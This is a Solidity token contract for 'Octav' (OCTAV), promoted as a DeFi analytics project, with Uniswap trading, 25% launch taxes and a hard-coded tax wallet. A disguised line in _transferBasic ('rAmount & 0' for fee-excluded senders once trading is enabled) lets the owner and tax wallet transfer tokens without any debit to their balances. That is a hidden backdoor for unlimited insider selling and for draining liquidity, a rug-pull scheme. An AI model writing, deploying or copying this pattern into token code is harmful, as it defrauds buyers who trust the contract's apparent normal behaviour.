// SPDX-License-Identifier: Unlicensed

/**
Smart DeFi Data Labelling and Analytics.

Octav's collaborative DeFi database streamlines your portfolio labeling, profit & loss reporting, and cross-chain tracking.

Website: https://www.octavfi.com
Telegram: https://t.me/octav_erc
Twitter: https://twitter.com/octav_erc
App: https://app.octavfi.com
**/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

interface InterfaceRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface InterfaceFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract OCTAV is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Octav";
    string private constant _symbol = "OCTAV";

    uint256 private _totalFee;
    uint256 private _redisBuyFee = 0;
    uint256 private _taxBuyFee = 25;
    uint256 private _redisSellFee = 0;
    uint256 private _taxSellFee = 25;

    uint256 private _redisFee = _redisSellFee;
    uint256 private _taxFee = _taxSellFee;

    uint256 private _previousRedisFee = _redisFee;
    uint256 private _previousTaxFee = _taxFee;

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 25 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshold = 10 ** 5 * 10 ** 9;
    address payable private taxWallet;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    bool private _tradeEnable;
    bool private _swapping = false;
    bool private _swapEnabled = true;

    InterfaceRouter public uniswapRouter;
    address public uniswapPair;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        InterfaceRouter _uniswapV2Router = InterfaceRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPair = InterfaceFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        taxWallet = payable(0xc05495aCac3493da3F8Eafa02909BF6a5293c5dE);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmounts(_rOwned[account]);
    }

    function restoreFee() private {
        _redisFee = _previousRedisFee;
        _taxFee = _previousTaxFee;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeEnable) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= feeSwapThreshold;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_swapping && to == uniswapPair && _swapEnabled && !_isExcludedFromFee[from] && amount > feeSwapThreshold) {
                swapTokensToETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(uniswapRouter)) {
                _redisFee = _redisBuyFee;
                _taxFee = _taxBuyFee;
            }
            if (to == uniswapPair && from != address(uniswapRouter)) {
                _redisFee = _redisSellFee;
                _taxFee = _taxSellFee;
            }
        }
        _transferStandard(from, to, amount, takeFee);
    }

    function _getTransferAmount(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getTotalSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferBasic(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    receive() external payable {}

    function sendFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousRedisFee = _redisFee;
        _previousTaxFee = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmounts(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalFee = _totalFee.add(tFee);
    }
    
    function _transferBasic(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValues(tAmount);
        rAmount = (_isExcludedFromFee[sender] && _tradeEnable) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeFees(tTeam);
        _getFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeFees(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWallet = _rTotal;
        
        _redisBuyFee = 0;
        _taxBuyFee = 1;
        _redisSellFee = 0;
        _taxSellFee = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeEnable = true;
    }
    
    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getTotalSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getAllValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getTransferAmount(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
}